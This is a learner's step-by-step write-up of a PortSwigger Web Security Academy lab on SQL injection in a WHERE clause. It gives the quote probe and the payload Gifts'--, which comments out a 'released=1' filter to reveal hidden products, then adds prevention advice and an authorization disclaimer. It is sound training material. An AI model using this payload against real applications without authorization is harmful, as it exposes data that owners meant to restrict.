# Lab 01 – SQL Injection in WHERE Clause (Retrieving Hidden Data)

##  Overview

This lab demonstrates a **SQL Injection (SQLi)** vulnerability in the `WHERE` clause of a SQL query. By injecting SQL syntax into a URL parameter, it is possible to bypass an application restriction and retrieve products that should remain hidden.

---

##  Objective

Exploit a SQL Injection vulnerability to display hidden products that are not normally visible to users.

---

##  Lab Information

| Property | Value |
|----------|-------|
| Platform | PortSwigger Web Security Academy |
| Category | SQL Injection |
| Difficulty | Apprentice |
| Vulnerability | SQL Injection in WHERE Clause |

---

##  Background

The application displays products based on a category selected by the user.

Example request:

```text
/products?category=Gifts
```

The application constructs the following SQL query:

```sql
SELECT * FROM products
WHERE category = 'Gifts'
AND released = 1;
```

The condition:

```sql
AND released = 1
```

ensures that only released products are displayed.

---

##  Step 1 – Identify the Input

Navigate to the **Gifts** category.

The URL looks similar to:

```text
/products?category=Gifts
```

 **Screenshot**

```
images/01-category-page.png
```

---

##  Step 2 – Test for SQL Injection

Append a single quote (`'`) to the category value.

Example:

```text
/products?category=Gifts'
```

This is a common test used to determine whether user input is being processed directly in a SQL query.

 **Screenshot**

```
images/02-single-quote-test.png
```

---

##  Step 3 – Exploit the Vulnerability

Inject the following payload:

```text
Gifts'--
```

Resulting URL:

```text
/products?category=Gifts'--
```

The backend query becomes:

```sql
SELECT * FROM products
WHERE category='Gifts'--'
AND released=1;
```

The SQL comment (`--`) causes the remainder of the query to be ignored.

As a result:

```sql
AND released=1
```

is no longer evaluated.

 **Screenshot**

```
images/03-payload.png
```

---

## Step 4 – Observe the Result

The application now displays products that were previously hidden.

This confirms that the application is vulnerable to SQL Injection.

 **Screenshot**

```
images/04-result.png
```

---

##  Why the Payload Works

The SQL comment sequence:

```sql
--
```

tells the database to ignore everything after it.

Original query:

```sql
SELECT * FROM products
WHERE category='Gifts'
AND released=1;
```

Injected query:

```sql
SELECT * FROM products
WHERE category='Gifts'--'
AND released=1;
```

Since the `released` condition is commented out, both released and unreleased products are returned.

---

##  Prevention

This vulnerability can be prevented by:

- Using parameterized queries (Prepared Statements)
- Validating and sanitizing user input
- Avoiding dynamic SQL queries
- Applying the principle of least privilege to database accounts
- Using secure coding practices

---

##  What I Learned

- How SQL Injection occurs in the `WHERE` clause.
- How SQL comments (`--`) can alter query execution.
- How hidden data can be retrieved through SQL Injection.
- The importance of parameterized queries for preventing SQL Injection.

---

##  Lab Status

**Completed Successfully**

 **Screenshot**

```
images/05-lab-solved.png
```

---

##  Disclaimer

This walkthrough was completed in the **PortSwigger Web Security Academy** lab environment for educational purposes only. The techniques demonstrated here should only be performed on systems you own or have explicit authorization to test.
